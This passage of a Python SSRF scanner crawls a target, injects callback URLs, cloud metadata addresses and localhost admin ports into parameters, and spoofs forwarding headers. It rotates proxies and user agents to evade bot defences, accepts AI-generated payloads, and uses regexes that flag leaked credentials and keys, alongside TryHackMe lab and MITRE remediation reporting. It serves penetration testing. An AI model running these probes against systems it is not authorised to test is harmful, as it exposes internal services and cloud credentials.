        if self.lab_profile in ("thm", "thm-basic-ssrf") and not self.manual_paths:
            self.manual_paths = ["/"]
        self.body_snippet_size = max(0, int(getattr(args, "body_snippet_size", 1200) or 0))
        self.custom_payloads = load_custom_payloads(getattr(args, "payload", None), getattr(args, "payload_file", None), self.lab_profile)
        self.proxy = args.proxy
        self.proxy_file = args.proxy_file
        self.proxy_type = args.proxy_type
        self.no_waf = args.no_waf
        self.no_ws = args.no_websocket
        self.no_grpc = args.no_grpc
        self.no_k8s = args.no_k8s
        self.no_serverless = args.no_serverless
        self.no_graphql = args.no_graphql
        self.no_api_schema = args.no_api_schema
        self.no_mesh = args.no_mesh
        self.no_bot_evasion = args.no_bot_evasion
        self.no_ai = args.no_ai
        self.dangerous_payloads = args.dangerous_payloads
        self.do_export_nuclei = args.export_nuclei
        self.do_export_siem = args.export_siem
        self.do_export_json_api = args.export_json_api
        self.do_attack_map = args.attack_map
        self.do_export_mitre = getattr(args, "export_mitre", False)

        self.output_dir = Path(args.output)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.llm = None; self.ai = None
        if args.ai_provider and args.ai_provider != "none" and not self.no_ai:
            self.llm = LLMClient(args.ai_provider, args.ai_key, args.ai_model)
            if self.llm.enabled:
                self.ai = AISkills(self.llm, dangerous_payloads=args.dangerous_payloads)

        self.evidence: List[SSRFEvidence] = []
        self.scan_attempts: List[ScanAttempt] = []
        self.ai_suggestions = []
        self.other_issue_attempts = []
        self.endpoints: List[DiscoveredEndpoint] = []
        self.params: Set[str] = set()
        self.callbacks = defaultdict(list)
        self.callback_context = {}
        self.waf_info = {}
        self.cloud = []
        self.internal_ips = set()

        self.proxy_mgr = None
        if args.proxy_file:
            self.proxy_mgr = ProxyManager.from_file(args.proxy_file, args.proxy_type)
        elif args.proxy:
            self.proxy_mgr = ProxyManager([args.proxy], args.proxy_type)

        self.waf = WAFFingerprinter()
        self.playwright = None; self.browser = None; self.page = None
        self.sem = asyncio.Semaphore(15)

        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.json_file = self.output_dir / f"ssrf_{safe}_{ts}.json"
        self.html_file = self.output_dir / f"ssrf_report_{safe}_{ts}.html"

    async def start(self):
        self.playwright = await async_playwright().start()
        launch_opts = {"headless": self.headless}
        if self.proxy_mgr:
            p = await self.proxy_mgr.pick()
            if p: launch_opts["proxy"] = {"server": p}
        self.browser = await self.playwright.chromium.launch(**launch_opts)
        ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await ctx.route("**/*", self._intercept)
        self.page = await ctx.new_page()

    async def stop(self):
        if self.browser: await self.browser.close()
        if self.playwright: await self.playwright.stop()

    async def _intercept(self, route):
        req = route.request
        url = req.url
        try:
            parsed = urllib.parse.urlparse(url)
            req_host = (parsed.hostname or "").lower()
            cb_host = self._callback_host()
            if cb_host and req_host.endswith(cb_host):
                ctx = self._find_callback_context(req_host)
                ev = SSRFEvidence(
                    phase=ctx.get("phase","BLIND_SSRF"), technique=ctx.get("technique","OOB Callback"),
                    url=url, endpoint=ctx.get("endpoint","unknown"), param=ctx.get("param","callback"),
                    payload=ctx.get("payload", url), status=200, body_snippet="",
                    matched_patterns=["[CRITICAL] OOB callback host requested"], severity="critical",
                    out_of_band_hit=True
                )
                ev.impact_score = self._impact(ev)
                self.evidence.append(ev)
                self.scan_attempts.append(ScanAttempt(
                    phase=ev.phase, technique=ev.technique, target=self.target, tested_url=url,
                    endpoint=ev.endpoint, param=ev.param, payload=ev.payload, status=200,
                    vulnerable=True, result="vulnerable", severity=ev.severity, confidence="high",
                    matched_patterns=ev.matched_patterns
                ))
                self.callbacks[req_host].append({
                    "time": datetime.now().isoformat(), "method": req.method,
                    "url": url, "endpoint": ev.endpoint, "param": ev.param, "payload": ev.payload
                })
        except Exception: pass
        await route.continue_()

    async def request(self, method, url, data=None, headers=None, timeout=15000):
        async with self.sem:
            try:
                safe_url = json.dumps(url)
                if method.upper() == "GET":
                    resp = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    status = resp.status if resp else 0
                    body = await resp.text() if resp else ""
                    hdrs = dict(resp.headers) if resp else {}
                else:
                    js = f"""(async () => {{
                        const r = await fetch({safe_url}, {{
                            method: '{method}',
                            headers: {json.dumps(headers or {})},
                            body: {json.dumps(json.dumps(data) if data else "")}
                        }});
                        return {{ status: r.status, body: await r.text(), headers: Object.fromEntries(r.headers) }};
                    }})();"""
                    result = await self.page.evaluate(js)
                    status = result.get("status",0); body = result.get("body",""); hdrs = result.get("headers",{})
                await asyncio.sleep(self.delay)
                return status, body, hdrs
            except Exception as e:
                return 0, "", {"_error": str(e)}

    async def direct_http_request(self, method, url, data=None, headers=None):
        if not AIOHTTP_AVAILABLE:
            return await self.request(method, url, data=data, headers=headers)
        async with self.sem:
            try:
                timeout = aiohttp.ClientTimeout(total=20)
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    if method.upper() == "GET":
                        async with session.get(url, headers=headers or {}, allow_redirects=True) as response:
                            body = await response.text(errors="replace")
                            await asyncio.sleep(self.delay)
                            return response.status, body, dict(response.headers)
                    async with session.request(method.upper(), url, json=data, headers=headers or {}, allow_redirects=True) as response:
                        body = await response.text(errors="replace")
                        await asyncio.sleep(self.delay)
                        return response.status, body, dict(response.headers)
            except Exception as e:
                return 0, "", {"_error": str(e)}

    async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
        patterns = [
            (r'root:[^:\n]+:[0-9]+:[0-9]+:', '/etc/passwd disclosure', 'critical'),
            (r'AKIA[0-9A-Z]{16}', 'AWS access key disclosure', 'critical'),
            (r'aws_access_key_id\s*[=:]', 'AWS credential configuration disclosure', 'critical'),
            (r'aws_secret_access_key\s*[=:]', 'AWS secret key disclosure', 'critical'),
            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata response marker', 'high'),
            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP reference', 'high'),
            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
            (r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}', 'Internal IP reference', 'medium'),
            (r'\$adminURL\s*=\s*["\'][^"\']+', 'PHP admin URL disclosure', 'high'),
            (r'\$username\s*=\s*["\'][^"\']+', 'PHP username disclosure', 'critical'),
            (r'\$password\s*=\s*["\'][^"\']+', 'PHP password disclosure', 'critical'),
            (r'\$db(user|username|pass|password|host)\s*=', 'PHP database config disclosure', 'critical'),
            (r'DB_(HOST|USER|USERNAME|PASSWORD|PASS|NAME)\s*[=:]', 'Database configuration disclosure', 'critical'),
            (r'(database_password|mysql_password|postgres_password)\s*[=:]', 'Database password disclosure', 'critical'),
            (r'(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]', 'Sensitive secret marker', 'critical'),
            (r'BEGIN (RSA |OPENSSH |EC |DSA )?PRIVATE KEY', 'Private key disclosure', 'critical'),
            (r'Username\s*:\s*[^\s<]{3,}', 'Username disclosure marker', 'medium'),
            (r'Password\s*:\s*[^\s<]{3,}', 'Password disclosure marker', 'critical'),
            (r'(?i)(connection\.php|config\.php|\.env|database configuration|db_password)', 'Sensitive configuration marker', 'high'),
            (r'(?i)(warning|fatal error|stack trace|traceback|uncaught exception).*?(php|python|node|java)', 'Application error disclosure', 'medium'),
        ]
        matched = []
        body_text = body or ""
        header_text = json.dumps(headers or {})
        combined = body_text + "\n" + header_text
        for pat, desc, sev in patterns:
            if re.search(pat, combined, re.I | re.S):
                matched.append(f"[{sev.upper()}] {desc}")
        payload_low = str(payload).lower()
        if status == 200 and self.lab_profile in ("thm", "thm-basic-ssrf"):
            if any(x in payload_low for x in ("localhost/config", "localhost/connection", "localhost/.env", "127.0.0.1/config")):
                if re.search(r'(\$username|\$password|\$adminURL|Username\s*:|Password\s*:|DB_|api[_-]?key|secret|token|connection\.php|config\.php)', combined, re.I):
                    matched.append("[CRITICAL] THM local SSRF sensitive resource disclosure")
        if self.cb and self.cb in body_text:
            matched.append("[CRITICAL] Callback in response")
        if matched:
            sev_rank = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
            sev = min(sev_rank.get(p.split("]")[0].replace("[",""),3) for p in matched)
            sev_map = {0:"critical",1:"high",2:"medium",3:"low"}
            ev = SSRFEvidence(phase=phase, technique=technique, url=url, endpoint=endpoint, param=param,
                              payload=payload, status=status, body_snippet=self._make_body_snippet(body_text),
                              matched_patterns=list(dict.fromkeys(matched)), severity=sev_map.get(sev,"info"), response_headers=headers)
            ev.impact_score = self._impact(ev)
            self.evidence.append(ev)
            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body_text)
            for ip in ips:
                self.internal_ips.add(ip[0] if isinstance(ip, tuple) else ip)
            return [ev]
        return []

    def _impact(self, ev):
        score = 0.0
        if ev.out_of_band_hit: score += 3
        if any("token" in p.lower() for p in ev.matched_patterns): score += 4
        elif any("metadata" in p.lower() for p in ev.matched_patterns): score += 2
        if re.search(r'(10\.|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168\.)', ev.url): score += 3
        return min(score, 10.0)

    async def test_payload(self, ep, param, payload, phase, technique, extra_headers=None):
        if not isinstance(payload, str): payload = str(payload)
        payload = payload.strip()
        if not payload: return False

        if ep.method == "GET":
            sep = "&" if "?" in ep.path else "?"
            url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(payload)}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("GET", url, headers=extra_headers)
        else:
            url = f"{self.base}{ep.path}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("POST", url, {param: payload}, headers=extra_headers)

        findings = await self.check_evidence(phase, technique, url, ep.path, param, payload, status, body, headers)
        error = headers.get("_error") if isinstance(headers,dict) else None
        vulnerable = bool(findings)

        if vulnerable:
            best = findings[0]
            result = "vulnerable"; severity = best.severity
            confidence = "high" if best.out_of_band_hit else "medium"
            matched_patterns = best.matched_patterns
        elif error:
            result = "error"; severity = "info"; confidence = "low"; matched_patterns = []
        else:
            result = "not_confirmed"; severity = "info"; confidence = "low"; matched_patterns = []

        self.scan_attempts.append(ScanAttempt(
            phase=phase, technique=technique, target=self.target, tested_url=url,
            endpoint=ep.path, param=param, payload=payload, status=status,
            vulnerable=vulnerable, result=result, severity=severity, confidence=confidence,
            matched_patterns=matched_patterns, error=error,
            body_snippet=self._make_body_snippet(body), content_length=len(body or "")
        ))
        return vulnerable

    async def test_url_template_payload(self, payload, phase="Direct URL", technique="Exact URL template"):
        if not self.url_template:
            return False
        if "PAYLOAD" not in self.url_template:
            if self.verbose:
                print(f"{WARN} --url template must contain PAYLOAD placeholder")
            return False
        if not isinstance(payload, str):
            payload = str(payload)
        payload = payload.strip()
        if not payload:
            return False
        tested_url = self.url_template.replace("PAYLOAD", urllib.parse.quote(payload, safe="/:"))
        self._register_callback_context(payload, "/", self.user_param or "url", phase, technique)
        status, body, headers = await self.direct_http_request("GET", tested_url)
        findings = await self.check_evidence(
            phase,
            technique,
            tested_url,
            "/",
            self.user_param or "url",
            payload,
            status,
            body,
            headers,
        )
        error = headers.get("_error") if isinstance(headers, dict) else None
        vulnerable = bool(findings)
        if vulnerable:
            best = findings[0]
            result = "vulnerable"
            severity = best.severity
            confidence = "high" if best.out_of_band_hit else "medium"
            matched_patterns = best.matched_patterns
        elif error:
            result = "error"
            severity = "info"
            confidence = "low"
            matched_patterns = []
        else:
            result = "not_confirmed"
            severity = "info"
            confidence = "low"
            matched_patterns = []
        self.scan_attempts.append(ScanAttempt(
            phase=phase,
            technique=technique,
            target=self.target,
            tested_url=tested_url,
            endpoint="/",
            param=self.user_param or "url",
            payload=payload,
            status=status,
            vulnerable=vulnerable,
            result=result,
            severity=severity,
            confidence=confidence,
            matched_patterns=matched_patterns,
            error=error,
            body_snippet=self._make_body_snippet(body),
            content_length=len(body or ""),
        ))
        if self.verbose:
            if vulnerable:
                print(f"  {RED}[VULNERABLE]{RESET} {tested_url}")
            elif error:
                print(f"  {DIM}[ERROR]{RESET} {tested_url} error={error}")
            else:
                print(f"  {DIM}[NOT CONFIRMED]{RESET} {tested_url}")
        return vulnerable

    async def discover(self):
        if self.verbose: print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling...")
        static_paths = ["/","/api","/proxy","/fetch","/graphql","/health","/ws","/socket","/grpc","/k8s"]
        crawled_paths = set(static_paths)
        try:
            await self.page.goto(self.base, wait_until="networkidle", timeout=20000)
            extracted = await self.page.evaluate("""() => {
                const paths = new Set();
                document.querySelectorAll('a[href]').forEach(a => {
                    try { const u = new URL(a.href, document.baseURI); if (u.origin === document.location.origin) paths.add(u.pathname+u.search); } catch(e) {}
                });
                document.querySelectorAll('form[action], script[src], iframe[src]').forEach(el => {
                    try { const u = new URL(el.action || el.src, document.baseURI); if (u.origin === document.location.origin) paths.add(u.pathname); } catch(e) {}
                });
                return Array.from(paths).slice(0,50);
            }""")
            crawled_paths.update(extracted)
        except Exception as e:
            if self.verbose: print(f"  {WARN} Crawl error: {e}")
        for p in crawled_paths:
            try:
                url = f"{self.base}{p}"
                s, b, h = await self.request("GET", url, timeout=8000)
                if s not in (0,404,403):
                    params = set(re.findall(r'[?&]([a-zA-Z_]\w*)=', p))
                    params.update(re.findall(r'name=["\']([^"\']+)["\']', b, re.I))
                    self.params.update(params)
                    ep = DiscoveredEndpoint(path=p, method="GET", params=params,
                                            accepts_url_param=True, test_response_code=s,
                                            content_type=h.get("content-type",""))
                    self.endpoints.append(ep)
            except: pass
        self._ensure_manual_endpoints()
        self.endpoints = self._prioritized_endpoints()
        if self.verbose: print(f"  {OK} {len(self.endpoints)} endpoints")

    async def detect_cloud(self):
        if self.verbose: print(f"\n{CYAN}[CLOUD]{RESET} Cloud provider...")
        s, b, h = await self.request("GET", self.base)
        body_low = b.lower()
        indicators = {"AWS":["x-amz-request-id","ec2"],"GCP":["x-goog-","metadata.google.internal"],
                      "Azure":["x-ms-request-id"],"Alibaba":["aliyungf"]}
        self.cloud = [c for c, pats in indicators.items() if any(p in body_low or p in str(h).lower() for p in pats)]
        if self.verbose:
            if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
            else: print(f"  {OK} No specific cloud")

    def _callback_host(self): return self.cb.replace("https://","").replace("http://","").strip("/").lower()
    def make_callback_url(self, tag="ssrf", scheme="http"):
        host = self._callback_host()
        token = random.randint(100000, 999999)
        return f"{scheme}://{tag}-{token}.{host}"

    def _register_callback_context(self, payload, endpoint, param, phase, technique):
        try:
            parsed = urllib.parse.urlparse(payload)
            payload_host = (parsed.hostname or "").lower()
            if not payload_host: return
            self.callback_context[payload_host] = {
                "endpoint": endpoint, "param": param, "payload": payload,
                "phase": phase, "technique": technique, "created_at": datetime.now().isoformat()
            }
        except Exception: pass

    def _params_for_endpoint(self, ep, fallback=None):
        if self.user_param:
            return [self.user_param]

        params = list(ep.params) if ep.params else []

        if fallback:
            for item in fallback:
                if item not in params:
                    params.append(item)

        if not params:
            params = ["url"]

        return params

    def _find_callback_context(self, request_host):
        request_host = (request_host or "").lower()
        for payload_host, ctx in self.callback_context.items():
            if request_host == payload_host or request_host.endswith("." + payload_host):
                return ctx
        return {}

    def _payloads_for_basic_phase(self):
        payloads = []
        if self.custom_payloads:
            payloads.extend(self.custom_payloads)
        payloads.append(self.make_callback_url("basic"))
        deduped = []
        seen = set()
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                deduped.append(payload)
        return deduped

    async def basic(self):
        if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Common SSRF parameters...")
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url", "uri", "file", "path", "redirect"]):
                for payload in self._payloads_for_basic_phase():
                    await self.test_payload(ep, param, payload, "Basic", f"param {param}")


    async def phase_graphql_ssrf(self):
        if self.no_graphql: return
        if self.verbose: print(f"\n{PURPLE}[GraphQL SSRF]{RESET} Testing...")

        introspection_query = """
        query {
          __schema {
            queryType { fields { name args { name type { kind name } } } }
            mutationType { fields { name args { name type { kind name } } } }
          }
        }"""
        for ep in self.endpoints:
            if "graphql" in ep.path.lower():

                s, b, _ = await self.request("POST", f"{self.base}{ep.path}", {"query": introspection_query})
                if "mutationType" in b:
                    payload = self.make_callback_url("graphql")

                    mutation = f"""mutation {{
                      someMutation(input: {{url: "{payload}"}} )
                    }}"""
                    await self.test_payload(ep, "query", mutation, "GraphQL", "Mutation URL arg")

    async def phase_api_schema_bypass(self):
        if self.no_api_schema: return
        if self.verbose: print(f"\n{PURPLE}[API Schema Bypass]{RESET} Probing...")

        for ep in self.endpoints:
            ct = "application/json"
            payload = self.make_callback_url("schema")

            data = {"url": [payload, "https://example.com"]}
            await self.test_payload(ep, "json", json.dumps(data), "API Schema", "JSON array bypass")

            data2 = {"legit": 1, "url": payload}
            await self.test_payload(ep, "json", json.dumps(data2), "API Schema", "Extra field")

    async def phase_service_mesh_ssrf(self):
        if self.no_mesh: return
        if self.verbose: print(f"\n{PURPLE}[Service Mesh SSRF]{RESET} Envoy/Istio admin...")
        targets = ["http://localhost:15000/", "http://127.0.0.1:15000/", "http://localhost:15020/"]
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
                for t in targets:
                    await self.test_payload(ep, param, t, "Mesh", f"Admin port")

    async def phase_bot_evasion(self):
        if self.no_bot_evasion: return
        if self.verbose: print(f"\n{PURPLE}[Bot Evasion]{RESET} Spoofing user agent...")

        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/125.0"
        ]
        for ua in ua_list:
            ctx = await self.browser.new_context(user_agent=ua)
            page = await ctx.new_page()

            if self.endpoints:
                ep = self.endpoints[0]
                param = self._params_for_endpoint(ep)[0]
                payload = self.make_callback_url("bot")
                await self.test_payload(ep, param, payload, "Bot Evasion", f"UA:{ua[:20]}...")
            await ctx.close()

    async def phase_kubernetes_ingress_bypass(self):
        if self.no_k8s: return
        if self.verbose: print(f"\n{PURPLE}[K8s Ingress SSRF]{RESET} Probing ingress...")

        headers_list = [
            {"X-Forwarded-Host": "169.254.169.254"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"Host": "metadata.google.internal"},
        ]
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
                for h in headers_list:
                    payload = self.make_callback_url("ingress")
                    await self.test_payload(ep, param, payload, "K8s Ingress", f"Header {h}", extra_headers=h)


    async def run_ai_phases(self):
        if not self.ai or not self.ai.enabled: return
        if self.verbose: print(f"\n{PURPLE}[AI PHASES]{RESET} Analysis...")
        context = {
            "target": self.target,
            "waf": self.waf_info.get("primary",""),
            "cloud": ",".join(self.cloud),
            "callback_host": self._callback_host(),
            "endpoints": [e.path for e in self.endpoints[:5]],
            "params": [self.user_param] if self.user_param else sorted(list(self.params))[:20],
            "user_param": self.user_param,
        }
        payloads = await self.ai.generate_payloads(context)
        ai_payloads = getattr(self.ai, "last_llm_payloads", [])
        if payloads and self.endpoints:
            ep = self.endpoints[0]
            param = self._params_for_endpoint(ep)[0]
            for payload in payloads[:10]:
                await self.test_payload(ep, param, payload, "AI-Generated", "AI Payload")

        await self.run_ai_suggested_tests(context)

        if self.scan_attempts:
            summary_data = [{
                "target": a.target, "endpoint": a.endpoint, "param": a.param,
                "payload": a.payload, "tested_url": a.tested_url, "status": a.status,
                "result": a.result, "vulnerable": a.vulnerable, "severity": a.severity,
                "confidence": a.confidence, "matched_patterns": a.matched_patterns or [], "error": a.error
            } for a in self.scan_attempts[:30]]
            triage = await self.ai.triage(summary_data)
            if triage:
                safe = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
                with open(self.output_dir / f"ai_triage_{safe}.md", "w", encoding="utf-8") as f:
                    f.write(triage)

    async def run_ai_suggested_tests(self, context):
        if not self.ai or not self.ai.enabled: return
        suggestions = await self.ai.suggest_additional_tests(context)
        self.ai_suggestions = suggestions
        if not suggestions: return
        endpoint_map = {e.path: e for e in self.endpoints}
        for suggestion in suggestions[:10]:
            ep = endpoint_map.get(suggestion.get("endpoint"))
            if not ep: continue
            value = suggestion.get("safe_test_value") or "test"
            if suggestion.get("issue_type") == "ssrf":
                await self.test_payload(ep, suggestion["param"], self.make_callback_url("ai"), "AI-SS", "AI SSRF")
            else:

                url = f"{self.base}{ep.path}?{suggestion['param']}={urllib.parse.quote(str(value))}"
                s, b, h = await self.request("GET", url)
                self.other_issue_attempts.append({
                    "issue_type": suggestion["issue_type"], "endpoint": ep.path,
                    "param": suggestion["param"], "payload": value, "status": s, "result": "manual_review",
                    "reason": suggestion.get("reason"),
                    "expected_signal": suggestion.get("expected_signal"),
                    "remediation_hint": suggestion.get("remediation_hint")
                })


    def _dedup(self):
        grouped = {}
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        for ev in self.evidence:
            key = (ev.endpoint, ev.param)
            if key not in grouped:
                grouped[key] = {"max_sev": ev.severity, "count": 0, "oob": 0, "items": []}
            grouped[key]["count"] += 1
            grouped[key]["items"].append(ev)
            if ev.out_of_band_hit:
                grouped[key]["oob"] += 1
            if sev_rank.get(ev.severity, 0) > sev_rank.get(grouped[key]["max_sev"], 0):
                grouped[key]["max_sev"] = ev.severity
        return grouped

    def _safe_target_name(self):
        return re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)

    def _normalize_manual_paths(self, paths):
        normalized = []
        for path in paths or []:
            path = str(path).strip() or "/"
            if path.startswith(("http://", "https://")):
                parsed = urllib.parse.urlparse(path)
                path = parsed.path or "/"
                if parsed.query:
                    path = f"{path}?{parsed.query}"
            if not path.startswith("/"):
                path = "/" + path
            if path not in normalized:
                normalized.append(path)
        return normalized

    def _is_static_asset(self, path):
        path_low = (path or "").lower().split("?", 1)[0]
        return path_low.endswith((".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".map"))

    def _make_body_snippet(self, body):
        if not body or self.body_snippet_size <= 0:
            return ""
        text = re.sub(r'\s+', ' ', str(body)).strip()
        return text[:self.body_snippet_size]

    def _ensure_endpoint(self, path="/", params=None, status=0, content_type="manual"):
        path = path or "/"
        if not path.startswith("/"):
            path = "/" + path
        for ep in self.endpoints:
            if ep.path == path:
                if params:
                    ep.params.update(params)
                    self.params.update(params)
                return ep
        ep = DiscoveredEndpoint(path=path, method="GET", params=set(params or []), accepts_url_param=True, test_response_code=status, content_type=content_type)
        self.endpoints.insert(0, ep)
        self.params.update(ep.params)
        return ep

    def _ensure_manual_endpoints(self):
        if self.manual_paths:
            for path in reversed(self.manual_paths):
                self._ensure_endpoint(path, params=[self.user_param] if self.user_param else ["url"])
        elif self.user_param or self.custom_payloads or self.lab_profile in ("thm", "thm-basic-ssrf"):
            self._ensure_endpoint("/", params=[self.user_param] if self.user_param else ["url"])

    def _prioritized_endpoints(self):
        def score(ep):
            if ep.path in self.manual_paths:
                return 0
            if ep.path == "/":
                return 1
            if "?" in ep.path:
                return 2
            if self._is_static_asset(ep.path):
                return 9
            return 4
        seen = set()
        ordered = []
        for ep in sorted(self.endpoints, key=score):
            if ep.path not in seen:
                seen.add(ep.path)
                ordered.append(ep)
        return ordered

    def _write_ai_payload_log(self, payloads, ai_payloads):
        if not payloads:
            return
        payload_log = self.output_dir / f"ai_payloads_{self._safe_target_name()}.json"
        with open(payload_log, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.target,
                "provider": self.llm.provider if self.llm else None,
                "model": self.llm.model if self.llm else None,
                "ai_usage": getattr(self.llm, "last_usage", {}) if self.llm else {},
                "ai_error": getattr(self.llm, "last_error", None) if self.llm else None,
                "ai_generated_payloads": ai_payloads,
                "all_payloads_used": payloads,
                "tested_payloads": payloads[:10]
            }, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} AI payloads saved: {payload_log}")

    def _mitre_ids_for_signal(self, text, phase="", technique="", payload="", endpoint=""):
        blob = " ".join(str(x or "") for x in (text, phase, technique, payload, endpoint)).lower()
        ids = {"T1190"}
        if any(x in blob for x in ("scan", "probe", "crawler", "discovery")):
            ids.add("T1595")
        if any(x in blob for x in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]", "internal ip", "10.", "192.168", "172.")):
            ids.add("T1046")
        if any(x in blob for x in ("169.254.169.254", "metadata.google.internal", "metadata", "iam/security-credentials", "service-accounts", "100.100.100.200")):
            ids.add("T1552.005")
            ids.add("T1528")
        if any(x in blob for x in ("username", "password", "secret", "token", "api_key", "apikey", "private key", "db_password", "credential")):
            ids.add("T1552")
        if any(x in blob for x in ("kubernetes", "k8s", "serviceaccount", "kubernetes.default.svc", "namespace", "pod")):
            ids.add("T1613")
        if any(x in blob for x in ("gopher://", "dict://", "redis", "smtp", "command", "shell")):
            ids.add("T1059")
        return sorted(ids)

    def _remediation_keys_for_signal(self, text, phase="", technique="", payload="", endpoint=""):
        blob = " ".join(str(x or "") for x in (text, phase, technique, payload, endpoint)).lower()
        keys = {"ssrf"}
        if any(x in blob for x in ("169.254.169.254", "metadata.google.internal", "metadata", "iam/security-credentials", "100.100.100.200")):
            keys.add("cloud_metadata")
        if any(x in blob for x in ("username", "password", "secret", "token", "api_key", "private key", "db_password", "credential")):
            keys.add("credential_disclosure")
        if any(x in blob for x in ("127.0.0.1", "localhost", "internal ip", "10.", "192.168", "172.")):
            keys.add("internal_discovery")
        if any(x in blob for x in ("kubernetes", "k8s", "serviceaccount", "kubernetes.default.svc")):
            keys.add("kubernetes")
        if any(x in blob for x in ("gopher://", "dict://", "ftp://", "file://", "ldap://")):
            keys.add("protocol_abuse")
        if any(x in blob for x in ("%0d", "%0a", "crlf", "x-injected", "header")):
            keys.add("header_injection")
        return sorted(keys)

    def _mitre_objects(self, mitre_ids):
        return [{"id": mid, **MITRE_ATTACK_LIBRARY.get(mid, {"technique": "Unknown", "tactic": "Unknown", "url": "", "atomic_red_team_path": "", "atomic_red_team_url": ""})} for mid in mitre_ids]

    def _remediation_items(self, keys):
        items = []
        seen = set()
        for key in keys:
            for item in REMEDIATION_LIBRARY.get(key, []):
                if item not in seen:
                    seen.add(item)
                    items.append({"category": key, "recommendation": item})
        return items

    def _mitre_record_for_attempt(self, attempt):
        patterns = ", ".join(attempt.matched_patterns or [])
        ids = self._mitre_ids_for_signal(patterns, attempt.phase, attempt.technique, attempt.payload, attempt.endpoint)
        remediation_keys = self._remediation_keys_for_signal(patterns, attempt.phase, attempt.technique, attempt.payload, attempt.endpoint)
        return {
            "source": "attempt",
            "target": self.target,
            "endpoint": attempt.endpoint,
            "param": attempt.param,
            "payload": attempt.payload,
            "tested_url": attempt.tested_url,
            "status": attempt.status,
            "result": attempt.result,
            "severity": attempt.severity,
            "confidence": attempt.confidence,
            "vulnerable": attempt.vulnerable,
            "matched_patterns": attempt.matched_patterns or [],
            "mitre_attack": self._mitre_objects(ids),
            "remediations": self._remediation_items(remediation_keys)
        }

    def _mitre_record_for_evidence(self, ev):
        patterns = ", ".join(ev.matched_patterns or [])
        ids = self._mitre_ids_for_signal(patterns, ev.phase, ev.technique, ev.payload, ev.endpoint)
        remediation_keys = self._remediation_keys_for_signal(patterns, ev.phase, ev.technique, ev.payload, ev.endpoint)
        return {
            "source": "evidence",
            "target": self.target,
            "endpoint": ev.endpoint,
            "param": ev.param,
            "payload": ev.payload,
            "url": ev.url,
            "status": ev.status,
            "severity": ev.severity,
            "impact_score": ev.impact_score,
            "out_of_band_hit": ev.out_of_band_hit,
            "matched_patterns": ev.matched_patterns,
            "mitre_attack": self._mitre_objects(ids),
            "remediations": self._remediation_items(remediation_keys)
        }

    def build_mitre_report(self):
        evidence_records = [self._mitre_record_for_evidence(ev) for ev in self.evidence]
        attempt_records = [self._mitre_record_for_attempt(a) for a in self.scan_attempts]
        all_records = evidence_records + attempt_records
        techniques = {}
        remediations = {}
        for record in all_records:
            for tech in record.get("mitre_attack", []):
                tid = tech.get("id")
                if tid:
                    techniques[tid] = tech
            for item in record.get("remediations", []):
                key = item.get("category")
                remediations.setdefault(key, [])
                if item not in remediations[key]:
                    remediations[key].append(item)
        return {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "framework_version": "5.0-waf-aware",
            "status": "vulnerable" if any(a.vulnerable for a in self.scan_attempts) or self.evidence else "not_confirmed",
            "note": "MITRE ATT&CK mapping is defensive context for triage and detection engineering. It does not mean the scanner executed Atomic Red Team tests.",
            "atomic_red_team_reference": "https://github.com/redcanaryco/atomic-red-team",
            "summary": {
                "techniques": list(techniques.values()),
                "remediation_categories": sorted(remediations.keys()),
                "total_records": len(all_records),
                "confirmed_evidence_records": len(evidence_records)
            },
            "records": all_records,
            "remediation_plan": remediations
        }

    def export_mitre_attack(self):
        if not self.do_export_mitre:
            return
        data = self.build_mitre_report()
        safe_target = self._safe_target_name()
        json_file = self.output_dir / f"mitre_attack_{safe_target}.json"
        md_file = self.output_dir / f"remediation_{safe_target}.md"
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        lines = [
            f"# MITRE ATT&CK Mapping and Remediation - {self.target}",
